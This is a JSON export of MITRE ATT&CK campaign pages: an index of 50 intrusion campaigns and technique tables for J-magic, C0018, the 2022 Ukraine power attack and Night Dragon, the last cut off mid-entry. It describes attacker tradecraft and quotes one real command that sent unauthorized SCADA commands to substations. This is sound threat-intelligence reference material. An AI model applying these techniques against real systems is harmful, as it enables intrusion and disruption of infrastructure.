[
{
"id": 415,
"title": "Campaigns",
"path": "/campaigns/index.html",
"content": " Campaigns The security community tracks intrusion activity using various analytic methodologies and terms, such as operations, intrusion sets, and campaigns. Some intrusion activity may be referenced by a variety of names due to different organizations tracking similar activity, often from different vantage points; conversely other times reported activity is not given a designated name. Malicious cyber activity may be attributed to a threat group, or referenced as unattributed activity. Alternatively, complex cyber operations may involve multiple affiliated or unaffiliated groups, with each playing a unique role (ie. initial access, data exfiltration, etc). For the purposes of the Campaigns page, the MITRE ATT&CK team uses the term Campaign to describe any grouping of intrusion activity conducted over a specific period of time with common targets and objectives. Unnamed intrusion activity is cited using a unique ATT&CK identifier, otherwise the team will use the activity name as noted in public reporting. For named Campaigns, the team makes a best effort to track overlapping names, which are designated as \u201cAssociated Campaigns\u201d on each page, as we believe these overlaps are useful for analysts. Campaign entries will also be attributed to ATT&CK Group and Software pages, when possible, based on public reporting; unattributed activity will simply reference \u201cthreat actors\u201d in the procedure example. Campaigns are mapped to publicly reporting techniques and original references are included. The information provided does not represent all possible techniques used in a Campaign but rather a subset that is available through open source reporting. Campaigns: 50 ID Name Description C0028 2015 Ukraine Electric Power Attack 2015 Ukraine Electric Power Attack was a Sandworm Team campaign during which they used BlackEnergy (specifically BlackEnergy3) and KillDisk to target and disrupt transmission and distribution substations within the Ukrainian power grid. This campaign was the first major public attack conducted against the Ukrainian power grid by Sandworm Team. C0025 2016 Ukraine Electric Power Attack 2016 Ukraine Electric Power Attack was a Sandworm Team campaign during which they used Industroyer malware to target and disrupt distribution substations within the Ukrainian power grid. This campaign was the second major public attack conducted against Ukraine by Sandworm Team. C0034 2022 Ukraine Electric Power Attack The 2022 Ukraine Electric Power Attack was a Sandworm Team campaign that used a combination of GOGETTER, Neo-REGEORG, CaddyWiper, and living of the land (LotL) techniques to gain access to a Ukrainian electric utility to send unauthorized commands from their SCADA system. C0051 APT28 Nearest Neighbor Campaign APT28 Nearest Neighbor Campaign was conducted by APT28 from early February 2022 to November 2024 against organizations and individuals with expertise on Ukraine. APT28 primarily leveraged living-off-the-land techniques, while leveraging the zero-day exploitation of CVE-2022-38028. Notably, APT28 leveraged Wi-Fi networks in close proximity to the intended target to gain initial access to the victim environment. By daisy-chaining multiple compromised organizations nearby the intended target, APT28 discovered dual-homed systems (with both a wired and wireless network connection) to enable Wi-Fi and use compromised credentials to connect to the victim network. C0040 APT41 DUST APT41 DUST was conducted by APT41 from 2023 to July 2024 against entities in Europe, Asia, and the Middle East. APT41 DUST targeted sectors such as shipping, logistics, and media for information gathering purposes. APT41 used previously-observed malware such as DUSTPAN as well as newly observed tools such as DUSTTRAP in APT41 DUST. C0046 ArcaneDoor ArcaneDoor is a campaign targeting networking devices from Cisco and other vendors between July 2023 and April 2024, primarily focused on government and critical infrastructure networks. ArcaneDoor is associated with the deployment of the custom backdoors Line Runner and Line Dancer. ArcaneDoor is attributed to a group referred to as UAT4356 or STORM-1849, and is assessed to be a state-sponsored campaign. C0010 C0010 C0010 was a cyber espionage campaign conducted by UNC3890 that targeted Israeli shipping, government, aviation, energy, and healthcare organizations. Security researcher assess UNC3890 conducts operations in support of Iranian interests, and noted several limited technical connections to Iran, including PDB strings and Farsi language artifacts. C0010 began by at least late 2020, and was still ongoing as of mid-2022. C0011 C0011 C0011 was a suspected cyber espionage campaign conducted by Transparent Tribe that targeted students at universities and colleges in India. Security researchers noted this campaign against students was a significant shift from Transparent Tribe's historic targeting Indian government, military, and think tank personnel, and assessed it was still ongoing as of July 2022. C0015 C0015 C0015 was a ransomware intrusion during which the unidentified attackers used Bazar, Cobalt Strike, and Conti, along with other tools, over a 5 day period. Security researchers assessed the actors likely used the widely-circulated Conti ransomware playbook based on the observed pattern of activity and operator errors. C0017 C0017 C0017 was an APT41 campaign conducted between May 2021 and February 2022 that successfully compromised at least six U.S. state government networks through the exploitation of vulnerable Internet facing web applications. During C0017, APT41 was quick to adapt and use publicly-disclosed as well as zero-day vulnerabilities for initial access, and in at least two cases re-compromised victims following remediation efforts. The goals of C0017 are unknown, however APT41 was observed exfiltrating Personal Identifiable Information (PII). C0018 C0018 C0018 was a month-long ransomware intrusion that successfully deployed AvosLocker onto a compromised network. The unidentified actors gained initial access to the victim network through an exposed server and used a variety of open-source tools prior to executing AvosLocker. C0021 C0021 C0021 was a spearphishing campaign conducted in November 2018 that targeted public sector institutions, non-governmental organizations (NGOs), educational institutions, and private-sector corporations in the oil and gas, chemical, and hospitality industries. The majority of targets were located in the US, particularly in and around Washington D.C., with other targets located in Europe, Hong Kong, India, and Canada. C0021's technical artifacts, tactics, techniques, and procedures (TTPs), and targeting overlap with previous suspected APT29 activity. C0026 C0026 C0026 was a campaign identified in September 2022 that included the selective distribution of KOPILUWAK and QUIETCANARY malware to previous ANDROMEDA malware victims in Ukraine through re-registered ANDROMEDA C2 domains. Several tools and tactics used during C0026 were consistent with historic Turla operations. C0027 C0027 C0027 was a financially-motivated campaign linked to Scattered Spider that targeted telecommunications and business process outsourcing (BPO) companies from at least June through December of 2022. During C0027 Scattered Spider used various forms of social engineering, performed SIM swapping, and attempted to leverage access from victim environments to mobile carrier networks. C0032 C0032 C0032 was an extended campaign suspected to involve the Triton adversaries with related capabilities and techniques focused on gaining a foothold within IT environments. This campaign occurred in 2019 and was distinctly different from the Triton Safety Instrumented System Attack. C0033 C0033 C0033 was a PROMETHIUM campaign during which they used StrongPity to target Android users. C0033 was the first publicly documented mobile campaign for PROMETHIUM, who previously used Windows-based techniques. C0004 CostaRicto CostaRicto was a suspected hacker-for-hire cyber espionage campaign that targeted multiple industries worldwide, with a large number being financial institutions. CostaRicto actors targeted organizations in Europe, the Americas, Asia, Australia, and Africa, with a large concentration in South Asia (especially India, Bangladesh, and Singapore), using custom malware, open source tools, and a complex network of proxies and SSH tunnels. C0029 Cutting Edge Cutting Edge was a campaign conducted by suspected China-nexus espionage actors, variously identified as UNC5221/UTA0178 and UNC5325, that began as early as December 2023 with the exploitation of zero-day vulnerabilities in Ivanti Connect Secure (previously Pulse Secure) VPN appliances. Cutting Edge targeted the U.S. defense industrial base and multiple sectors globally including telecommunications, financial, aerospace, and technology. Cutting Edge featured the use of defense evasion and living-off-the-land (LoTL) techniques along with the deployment of web shells and other custom malware. C0053 FLORAHOX Activity FLORAHOX Activity is conducted using a hybrid operational relay box (ORB) network, which combines two types of infrastructure: compromised devices and leased Virtual Private Servers (VPS). The compromised devices include end-of-life routers and IoT devices, while VPS space is commercially leased and managed by ORB network administrators. This hybrid ORB network allows adversaries to proxy and obscure malicious traffic, making the source of the traffic more difficult to trace. The FLORAHOX ORB network has been leveraged by multiple cyber threat actors, including China-nexus actors like ZIRCONIUM. These adversaries conduct espionage campaigns through FLORAHOX Activity, relying on the ORB network's ability to funnel traffic through Tor nodes, provisioned VPS servers, and compromised routers to obfuscate malicious traffic. C0001 Frankenstein Frankenstein was described by security researchers as a highly-targeted campaign conducted by moderately sophisticated and highly resourceful threat actors in early 2019. The unidentified actors primarily relied on open source tools, including Empire. The campaign name refers to the actors' ability to piece together several unrelated open-source tool components. C0041 FrostyGoop Incident FrostyGoop Incident took place in January 2024 against a municipal district heating company in Ukraine. Following initial access via likely exploitation of external facing services, FrostyGoop was used to manipulate ENCO control systems via legitimate Modbus commands to impact the delivery of heating services to Ukrainian civilians. C0007 FunnyDream FunnyDream was a suspected Chinese cyber espionage campaign that targeted government and foreign organizations in Malaysia, the Philippines, Taiwan, Vietnam, and other parts of Southeast Asia. Security researchers linked the FunnyDream campaign to possible Chinese-speaking threat actors through the use of the Chinoxy backdoor and noted infrastructure overlap with the TAG-16 threat group. C0038 HomeLand Justice HomeLand Justice was a disruptive campaign involving the use of ransomware, wiper malware, and sensitive information leaks conducted by Iranian state cyber actors against Albanian government networks in July and September 2022. Initial access for HomeLand Justice was established in May 2021 as threat actors subsequently moved laterally, exfiltrated sensitive information, and maintained persistence for approximately 14 months prior to the attacks. Responsibility was claimed by the \"HomeLand Justice\" front whose messaging indicated targeting of the Mujahedeen-e Khalq (MEK), an Iranian opposition group who maintain a refugee camp in Albania, and were formerly designated a terrorist organization by the US State Department. A second wave of attacks was launched in September 2022 using similar tactics after public attribution of the previous activity to Iran and the severing of diplomatic ties between Iran and Albania. C0043 Indian Critical Infrastructure Intrusions Indian Critical Infrastructure Intrusions is a sequence of intrusions from 2021 through early 2022 linked to People\u2019s Republic of China (PRC) threat actors, particularly RedEcho and Threat Activity Group 38 (TAG38). The intrusions appear focused on IT system breach in Indian electric utility entities and logistics firms, as well as potentially managed service providers operating within India. Although focused on OT-operating entities, there is no evidence this campaign was able to progress beyond IT breach and information gathering to OT environment access. C0050 J-magic Campaign The J-magic Campaign was active from mid-2023 to at least mid-2024 and featured the use of the J-magic backdoor, a custom cd00r variant tailored for use against Juniper routers. The J-magic Campaign targeted Junos OS routers serving as VPN gateways primarily in the semiconductor, energy, manufacturing, and IT sectors. C0044 Juicy Mix Juicy Mix was a campaign conducted by OilRig throughout 2022 that targeted Israeli organizations with the Mango backdoor. C0035 KV Botnet Activity KV Botnet Activity consisted of exploitation of primarily \"end-of-life\" small office-home office (SOHO) equipment from manufacturers such as Cisco, NETGEAR, and DrayTek. KV Botnet Activity was used by Volt Typhoon to obfuscate connectivity to victims in multiple critical infrastructure segments, including energy and telecommunication companies and entities based on the US territory of Guam. While the KV Botnet is the most prominent element of this campaign, it overlaps with another botnet cluster referred to as the JDY cluster. This botnet was disrupted by US law enforcement entities in early 2024 after periods of activity from October 2022 through January 2024. C0049 Leviathan Australian Intrusions Leviathan Australian Intrusions consisted of at least two long-term intrusions against victims in Australia by Leviathan, relying on similar tradecraft such as external service exploitation followed by extensive credential capture and re-use to enable privilege escalation and lateral movement. Leviathan Australian Intrusions were focused on exfiltrating sensitive data including valid credentials for the victim organizations. C0020 Maroochy Water Breach Maroochy Water Breach was an incident in 2000 where an adversary leveraged the local government\u2019s wastewater control system and stolen engineering equipment to disrupt and eventually release 800,000 liters of raw sewage into the local community. C0002 Night Dragon Night Dragon was a cyber espionage campaign that targeted oil, energy, and petrochemical companies, along with individuals and executives in Kazakhstan, Taiwan, Greece, and the United States. The unidentified threat actors searched for information related to oil and gas field production systems, financials, and collected data from SCADA systems. Based on the observed techniques, tools, and network activities, security researchers assessed the campaign involved a threat group based in China. C0012 Operation CuckooBees Operation CuckooBees was a cyber espionage campaign targeting technology and manufacturing companies in East Asia, Western Europe, and North America since at least 2019. Security researchers noted the goal of Operation CuckooBees, which was still ongoing as of May 2022, was likely the theft of proprietary information, research and development documents, source code, and blueprints for various technologies. Researchers assessed Operation CuckooBees was conducted by actors affiliated with Winnti Group, APT41, and BARIUM. C0022 Operation Dream Job Operation Dream Job was a cyber espionage operation likely conducted by Lazarus Group that targeted the defense, aerospace, government, and other sectors in the United States, Israel, Australia, Russia, and India. In at least one case, the cyber actors tried to monetize their network access to conduct a business email compromise (BEC) operation. In 2020, security researchers noted overlapping TTPs, to include fake job lures and code similarities, between Operation Dream Job, Operation North Star, and Operation Interception; by 2022 security researchers described Operation Dream Job as an umbrella term covering both Operation Interception and Operation North Star. C0016 Operation Dust Storm Operation Dust Storm was a long-standing persistent cyber espionage campaign that targeted multiple industries in Japan, South Korea, the United States, Europe, and several Southeast Asian countries. By 2015, the Operation Dust Storm threat actors shifted from government and defense-related intelligence targets to Japanese companies or Japanese subdivisions of larger foreign organizations supporting Japan's critical infrastructure, including electricity generation, oil and natural gas, finance, transportation, and construction. Operation Dust Storm threat actors also began to use Android backdoors in their operations by 2015, with all identified victims at the time residing in Japan or South Korea. C0023 Operation Ghost Operation Ghost was an APT29 campaign starting in 2013 that included operations against ministries of foreign affairs in Europe and the Washington, D.C. embassy of a European Union country. During Operation Ghost, APT29 used new families of malware and leveraged web services, steganography, and unique C2 infrastructure for each victim. C0006 Operation Honeybee Operation Honeybee was a campaign that targeted humanitarian aid and inter-Korean affairs organizations from at least late 2017 through early 2018. Operation Honeybee initially targeted South Korea, but expanded to include Vietnam, Singapore, Japan, Indonesia, Argentina, and Canada. Security researchers assessed the threat actors were likely Korean speakers based on metadata used in both lure documents and executables, and named the campaign \"Honeybee\" after the author name discovered in malicious Word documents. C0048 Operation MidnightEclipse Operation MidnightEclipse was a campaign conducted in March and April 2024 that involved initial exploit of zero-day vulnerability CVE-2024-3400, a critical command injection vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS. C0013 Operation Sharpshooter Operation Sharpshooter was a global cyber espionage campaign that targeted nuclear, defense, government, energy, and financial companies, with many located in Germany, Turkey, the United Kingdom, and the United States. Security researchers noted the campaign shared many similarities with previous Lazarus Group operations, including fake job recruitment lures and shared malware code. C0005 Operation Spalax Operation Spalax was a campaign that primarily targeted Colombian government organizations and private companies, particularly those associated with the energy and metallurgical industries. The Operation Spalax threat actors distributed commodity malware and tools using generic phishing topics related to COVID-19, banking, and law enforcement action. Security researchers noted indicators of compromise and some infrastructure overlaps with other campaigns dating back to April 2018, including at least one separately attributed to APT-C-36, however identified enough differences to report this as separate, unattributed activity. C0054 Operation Triangulation Operation Triangulation is a mobile campaign targeting iOS devices. The unidentified actors used zero-click exploits in iMessage attachments to gain Initial Access, then executed exploits and validators, such as Binary Validator before finally executing the TriangleDB implant. C0014 Operation Wocao Operation Wocao was a cyber espionage campaign that targeted organizations around the world, including in Brazil, China, France, Germany, Italy, Mexico, Portugal, Spain, the United Kingdom, and the United States. The suspected China-based actors compromised government organizations and managed service providers, as well as aviation, construction, energy, finance, health care, insurance, offshore engineering, software development, and transportation companies. Security researchers assessed the Operation Wocao actors used similar TTPs and tools as APT20, suggesting a possible overlap. Operation Wocao was named after an observed command line entry by one of the threat actors, possibly out of frustration from losing webshell access. C0042 Outer Space Outer Space was a campaign conducted by OilRig throughout 2021 that used the SampleCheck5000 downloader and Solar backdoor to target Israeli organizations. C0036 Pikabot Distribution February 2024 Pikabot was distributed in Pikabot Distribution February 2024 using malicious emails with embedded links leading to malicious ZIP archives requiring user interaction for follow-on infection. The version of Pikabot distributed featured significant changes over the 2023 variant, including reduced code complexity and simplified obfuscation mechanisms. C0047 RedDelta Modified PlugX Infection Chain Operations RedDelta Modified PlugX Infection Chain Operations was executed by Mustang Panda from mid-2023 through the end of 2024 against multiple entities in East and Southeast Asia. RedDelta Modified PlugX Infection Chain Operations involved phishing to deliver malicious files or links to users prompting follow-on installer downloads to load PlugX on victim machines in a persistent state. C0045 ShadowRay ShadowRay was a campaign that began in late 2023 targeting the education, cryptocurrency, biopharma, and other sectors through a vulnerability (CVE-2023-48022) in the Ray AI framework named ShadowRay. According to security researchers ShadowRay was the first known instance of AI workloads being activley exploited in the wild through vulnerabilities in AI infrastructure. CVE-2023-48022, which allows access to compute resources and sensitive data for exposed instances, remains unpatched and has been disputed by the vendor as they maintain that Ray is not intended for use outside of a strictly controlled network environment. C0024 SolarWinds Compromise The SolarWinds Compromise was a sophisticated supply chain cyber operation conducted by APT29 that was discovered in mid-December 2020. APT29 used customized malware to inject malicious code into the SolarWinds Orion software build process that was later distributed through a normal software update; they also used password spraying, token theft, API abuse, spear phishing, and other supply chain attacks to compromise user accounts and leverage their associated access. Victims of this campaign included government, consulting, technology, telecom, and other organizations in North America, Europe, Asia, and the Middle East. This activity has been labled the StellarParticle campaign in industry reporting. Industry reporting also initially referred to the actors involved in this campaign as UNC2452, NOBELIUM, Dark Halo, and SolarStorm. In April 2021, the US and UK governments attributed the SolarWinds Compromise to Russia's Foreign Intelligence Service (SVR); public statements included citations to APT29, Cozy Bear, and The Dukes. The US government assessed that of the approximately 18,000 affected public and private sector customers of Solar Winds\u2019 Orion product, a much smaller number were compromised by follow-on APT29 activity on their systems. C0052 SPACEHOP Activity SPACEHOP Activity is conducted through commercially leased Virtual Private Servers (VPS), otherwise known as provisioned Operational Relay Box (ORB) networks. The network leveraged for SPACEHOP Activity enabled China-nexus cyber threat actors \u2013 such as APT5 and Ke3chang \u2013 to perform network reconnaissance scanning and vulnerability exploitation. SPACEHOP Activity has historically targeted entities in North America, Europe, and the Middle East. C0030 Triton Safety Instrumented System Attack Triton Safety Instrumented System Attack was a campaign employed by TEMP.Veles which leveraged the Triton malware framework against a petrochemical organization. The malware and techniques used within this campaign targeted specific Triconex Safety Controllers within the environment. The incident was eventually discovered due to a safety trip that occurred as a result of an issue in the malware. C0031 Unitronics Defacement Campaign The Unitronics Defacement Campaign was a collection of intrusions across multiple sectors by the CyberAv3ngers, where threat actors engaged in a seemingly opportunistic and global targeting and defacement of Unitronics Vision Series Programmable Logic Controller (PLC) with Human-Machine Interface (HMI). The sectors that these PLCs can be commonly found in are water and wastewater, energy, food and beverage manufacturing, and healthcare. The most notable feature of this attack was the defacement of the PLCs' HMIs. C0039 Versa Director Zero Day Exploitation Versa Director Zero Day Exploitation was conducted by Volt Typhoon from early June through August 2024 as zero-day exploitation of Versa Director servers controlling software-defined wide area network (SD-WAN) applications. Since tracked as CVE-2024-39717, exploitation focused on credential capture from compromised Versa Director servers at managed service providers (MSPs) and internet service providers (ISPs) to enable follow-on access to service provider clients. Versa Director Zero Day Exploitation was followed by the delivery of the VersaMem web shell for both credential theft and follow-on code execution. C0037 Water Curupira Pikabot Distribution Pikabot was distributed in Water Curupira Pikabot Distribution throughout 2023 by an entity linked to BlackBasta ransomware deployment via email attachments. This activity followed the take-down of QakBot, with several technical overlaps and similarities with QakBot, indicating a possible connection. The identified activity led to the deployment of tools such as Cobalt Strike, while coinciding with campaigns delivering DarkGate and IcedID en route to ransomware deployment. "
},
{
"id": 416,
"title": "J-magic Campaign, Campaign C0050",
"path": "/campaigns/C0050/index.html",
"content": " J-magic Campaign The J-magic Campaign was active from mid-2023 to at least mid-2024 and featured the use of the J-magic backdoor, a custom cd00r variant tailored for use against Juniper routers. The J-magic Campaign targeted Junos OS routers serving as VPN gateways primarily in the semiconductor, energy, manufacturing, and IT sectors. [1] ID: C0050 First Seen: June 2023 [1] Last Seen: June 2024 [1] Version: 1.0 Created: 18 February 2025 Last Modified: 19 February 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .003 Acquire Infrastructure: Virtual Private Server During the J-magic Campaign, threat actors acquired VPS for use in C2.[1] Enterprise T1587 .003 Develop Capabilities: Digital Certificates During the J-magic Campaign, threat actors used self-signed certificates on VPS C2 infrastructure.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location During the J-magic Campaign, threat actors used the name \"JunoscriptService\" to masquerade malware as the Junos automation scripting service.[1] Enterprise T1588 .001 Obtain Capabilities: Malware During the J-magic Campaign campaign, threat actors used open-source malware post-compromise including a custom variant of the cd00r backdoor.[1] Software ID Name Description S1203 J-magic [1] References Black Lotus Labs. (2025, January 23). The J-Magic Show: Magic Packets and Where to find them. Retrieved February 17, 2025. "
},
{
"id": 417,
"title": "C0018, Campaign C0018",
"path": "/campaigns/C0018/index.html",
"content": " C0018 C0018 was a month-long ransomware intrusion that successfully deployed AvosLocker onto a compromised network. The unidentified actors gained initial access to the victim network through an exposed server and used a variety of open-source tools prior to executing AvosLocker.[1][2] ID: C0018 First Seen: February 2022 [2] Last Seen: March 2022 [2] Contributors: Flavio Costa, Cisco Version: 1.0 Created: 17 January 2023 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols During C0018, the threat actors used HTTP for C2 communications.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell During C0018, the threat actors used encoded PowerShell scripts for execution.[2][1] Enterprise T1486 Data Encrypted for Impact During C0018, the threat actors used AvosLocker ransomware to encrypt files on the compromised network.[2][1] Enterprise T1190 Exploit Public-Facing Application During C0018, the threat actors exploited VMWare Horizon Unified Access Gateways that were vulnerable to several Log4Shell vulnerabilities, including CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, and CVE-2021-44832.[2] Enterprise T1105 Ingress Tool Transfer During C0018, the threat actors downloaded additional tools, such as Mimikatz and Sliver, as well as Cobalt Strike and AvosLocker ransomware onto the victim network.[2][1] Enterprise T1570 Lateral Tool Transfer During C0018, the threat actors transferred the SoftPerfect Network Scanner and other tools to machines in the network using AnyDesk and PDQ Deploy.[2][1] Enterprise T1036 Masquerading During C0018, AvosLocker was disguised using the victim company name as the filename.[2] .005 Match Legitimate Resource Name or Location For C0018, the threat actors renamed a Sliver payload to vmware_kb.exe.[2] Enterprise T1046 Network Service Discovery During C0018, the threat actors used the SoftPerfect Network Scanner for network scanning.[2] Enterprise T1571 Non-Standard Port During C0018, the threat actors opened a variety of ports, including ports 28035, 32467, 41578, and 46892, to establish RDP connections.[1] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation During C0018, the threat actors used Base64 to encode their PowerShell scripts.[2][1] Enterprise T1588 .002 Obtain Capabilities: Tool For C0018, the threat actors acquired a variety of open source tools, including Mimikatz, Sliver, SoftPerfect Network Scanner, AnyDesk, and PDQ Deploy.[2][1] Enterprise T1219 .002 Remote Access Tools: Remote Desktop Software During C0018, the threat actors used AnyDesk to transfer tools between systems.[2][1] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol During C0018, the threat actors opened a variety of ports to establish RDP connections, including ports 28035, 32467, 41578, and 46892.[1] Enterprise T1072 Software Deployment Tools During C0018, the threat actors used PDQ Deploy to move AvosLocker and tools across the network.[2] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 During C0018, the threat actors used rundll32 to run Mimikatz.[1] Enterprise T1016 System Network Configuration Discovery During C0018, the threat actors ran nslookup and Advanced IP Scanner on the target network.[1] Enterprise T1033 System Owner/User Discovery During C0018, the threat actors collected whoami information via PowerShell scripts.[1] Enterprise T1047 Windows Management Instrumentation During C0018, the threat actors used WMIC to modify administrative settings on both a local and a remote host, likely as part of the first stages for their lateral movement; they also used WMI Provider Host (wmiprvse.exe) to execute a variety of encoded PowerShell scripts using the DownloadString method.[2][1] Software ID Name Description S1053 AvosLocker During C0018, the threat actors used AvosLocker ransomware to encrypt the compromised network.[1][2] S0154 Cobalt Strike [2] S0002 Mimikatz [2][1] S0108 netsh During C0018, the threat actors used netsh on a domain controller to ensure there was no existing firewall or to disable one.[1] S0097 Ping During C0018, the threat actors used a PowerShell script to execute Ping commands once every minute against a domain controller.[1] S0633 Sliver [2] References Costa, F. (2022, May 1). RaaS AvosLocker Incident Response Analysis. Retrieved January 11, 2023. Venere, G. Neal, C. (2022, June 21). Avos ransomware group expands with new attack arsenal. Retrieved January 11, 2023. "
},
{
"id": 418,
"title": "2022 Ukraine Electric Power Attack, Campaign C0034",
"path": "/campaigns/C0034/index.html",
"content": " 2022 Ukraine Electric Power Attack The 2022 Ukraine Electric Power Attack was a Sandworm Team campaign that used a combination of GOGETTER, Neo-REGEORG, CaddyWiper, and living of the land (LotL) techniques to gain access to a Ukrainian electric utility to send unauthorized commands from their SCADA system.[1][2] ID: C0034 First Seen: June 2022 [1] Last Seen: October 2022 [1] Version: 1.0 Created: 27 March 2024 Last Modified: 10 April 2024 Version Permalink Live Version Groups ID Name Description G0034 Sandworm Team [1][2] Techniques Used Domain ID Name Use Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell During the 2022 Ukraine Electric Power Attack, Sandworm Team utilized a PowerShell utility called TANKTRAP to spread and launch a wiper using Windows Group Policy.[1] Enterprise T1543 .002 Create or Modify System Process: Systemd Service During the 2022 Ukraine Electric Power Attack, Sandworm Team configured Systemd to maintain persistence of GOGETTER, specifying the WantedBy=multi-user.target configuration to run GOGETTER when the system begins accepting user logins.[1] Enterprise T1485 Data Destruction During the 2022 Ukraine Electric Power Attack, Sandworm Team deployed CaddyWiper on the victim\u2019s IT environment systems to wipe files related to the OT capabilities, along with mapped drives, and physical drive partitions.[1] Enterprise T1484 .001 Domain or Tenant Policy Modification: Group Policy Modification During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Group Policy Objects (GPOs) to deploy and execute malware.[1] Enterprise T1570 Lateral Tool Transfer During the 2022 Ukraine Electric Power Attack, Sandworm Team used a Group Policy Object (GPO) to copy CaddyWiper's executable msserver.exe from a staging server to a local hard drive before deployment.[1] Enterprise T1036 .004 Masquerading: Masquerade Task or Service During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Systemd service units to masquerade GOGETTER malware as legitimate or seemingly legitimate services.[1] Enterprise T1095 Non-Application Layer Protocol During the 2022 Ukraine Electric Power Attack, Sandworm Team proxied C2 communications within a TLS-based tunnel.[1] Enterprise T1572 Protocol Tunneling During the 2022 Ukraine Electric Power Attack, Sandworm Team deployed the GOGETTER tunneler software to establish a \"Yamux\" TLS-based C2 channel with an external server(s).[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Scheduled Tasks through a Group Policy Object (GPO) to execute CaddyWiper at a predetermined time.[1] Enterprise T1505 .003 Server Software Component: Web Shell During the 2022 Ukraine Electric Power Attack, Sandworm Team deployed the Neo-REGEORG webshell on an internet-facing server.[1] ICS T0895 Autorun Image During the 2022 Ukraine Electric Power Attack, Sandworm Team used existing hypervisor access to map an ISO image named a.iso to a virtual machine running a SCADA server. The SCADA server\u2019s operating system was configured to autorun CD-ROM images, and as a result, a malicious VBS script on the ISO image was automatically executed.[1] ICS T0807 Command-Line Interface During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged the SCIL-API on the MicroSCADA platform to execute commands through the scilc.exe binary.[1] ICS T0853 Scripting During the 2022 Ukraine Electric Power Attack, Sandworm Team utilizes a Visual Basic script lun.vbs to execute n.bat which then executed the MicroSCADA scilc.exe command.[1] ICS T0894 System Binary Proxy Execution During the 2022 Ukraine Electric Power Attack, Sandworm Team executed a MicroSCADA application binary scilc.exe to send a predefined list of SCADA instructions specified in a file defined by the adversary, s1.txt. The executed command C:\\sc\\prog\\exec\\scilc.exe -do pack\\scil\\s1.txt leverages the SCADA software to send unauthorized command messages to remote substations.[1] ICS T0855 Unauthorized Command Message During the 2022 Ukraine Electric Power Attack, Sandworm Team used the MicroSCADA SCIL-API to specify a set of SCADA instructions, including the sending of unauthorized commands to substation devices.[1] Software ID Name Description S0693 CaddyWiper [1] References Ken Proska, John Wolfram, Jared Wilson, Dan Black, Keith Lunden, Daniel Kapellmann Zafra, Nathan Brubaker, Tyler Mclellan, Chris Sistrunk. (2023, November 9). Sandworm Disrupts Power in Ukraine Using a Novel Attack Against Operational Technology. Retrieved March 28, 2024. Dragos, Inc.. (2023, December 11). ELECTRUM Targeted Ukrainian Electric Entity Using Custom Tools and CaddyWiper Malware, October 2022. Retrieved March 28, 2024. "
},
{
"id": 419,
"title": "Night Dragon, Campaign C0002",
"path": "/campaigns/C0002/index.html",
"content": " Night Dragon Night Dragon was a cyber espionage campaign that targeted oil, energy, and petrochemical companies, along with individuals and executives in Kazakhstan, Taiwan, Greece, and the United States. The unidentified threat actors searched for information related to oil and gas field production systems, financials, and collected data from SCADA systems. Based on the observed techniques, tools, and network activities, security researchers assessed the campaign involved a threat group based in China.[1] ID: C0002 First Seen: November 2009 [1] Last Seen: February 2011 [1] Version: 1.1 Created: 08 September 2022 Last Modified: 11 April 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .004 Acquire Infrastructure: Server During Night Dragon, threat actors purchased hosted services to use for C2.[1] Enterprise T1071 .001 Application Layer Protocol: Web Protocols During Night Dragon, threat actors used HTTP for C2.[1] Enterprise T1110 .002 Brute Force: Password Cracking During Night Dragon, threat actors used Cain & Abel to crack password hashes.[1] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell During Night Dragon, threat actors used zwShell to establish full remote control of the connected machine and run command-line shells.[1] Enterprise T1584 .004 Compromise Infrastructure: Server During Night Dragon, threat actors compromised web servers to use for C2.[1] Enterprise T1005 Data from Local System During Night Dragon, the threat actors collected files and other data from compromised systems.[1] Enterprise T1074 .002 Data Staged: Remote Data Staging During Night Dragon, threat actors copied files to company web servers and subsequently downloaded them.[1] Enterprise T1568 Dynamic Resolution During Night Dragon, threat actors used dynamic DNS services for C2.[1] Enterprise T1114 .001 Email Collection: Local Email Collection During Night Dragon, threat actors used RAT malware to exfiltrate email archives.[1] Enterprise T1190 Exploit Public-Facing Application During Night Dragon, threat actors used SQL injection exploits against extranet web servers to gain access.[1] Enterprise T1133 External Remote Services During Night Dragon, threat actors used compromised VPN accounts to gain access to victim systems.[1] Enterprise T1008 Fallback Channels During Night Dragon, threat actors used company extranet servers as secondary C2 servers.[1] Enterprise T1083 File and Directory Discovery During Night Dragon, threat actors used zwShell to establish full remote control of the connected machine and browse the victim file system.[1] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools During Night Dragon, threat actors disabled anti-virus and anti-spyware tools in some instances on the victim\u2019s machines. The actors also disabled proxy settings to allow direct communication from victims to the Internet.[1] Enterprise T1105 Ingress Tool Transfer During Night Dragon, threat actors used administrative utilities to deliver Trojan components to remote systems.[1] Enterprise T1112 Modify Registry During Night Dragon, threat actors used zwShell to establish full remote control of the connected machine and manipulate the Registry.[1] Enterprise T1027 .002 Obfuscated Files or Information: Software Packing During Night Dragon, threat actors used software packing in its tools.[1] .013 Obfuscated Files or Information: Encrypted/Encoded File During Night Dragon, threat actors used a DLL that included an XOR-encoded section.[1] Enterprise T1588 .001 Obtain Capabilities: Malware During Night Dragon, threat actors used Trojans from underground hacker websites.[1] .002 Obtain Capabilities: Tool During Night Dragon, threat actors obtained and used tools such as gsecdump.[1] Enterprise T1003 .002 OS Credential Dumping: Security Account Manager During Night Dragon, threat actors dumped account hashes using gsecdump.[1] Enterprise T1566 .002 Phishing: Spearphishing Link During Night Dragon, threat actors sent spearphishing emails containing links to compromised websites where malware was downloaded.[1] Enterprise T1219 Remote Access Tools During Night Dragon, threat actors used several remote administration tools as persistent 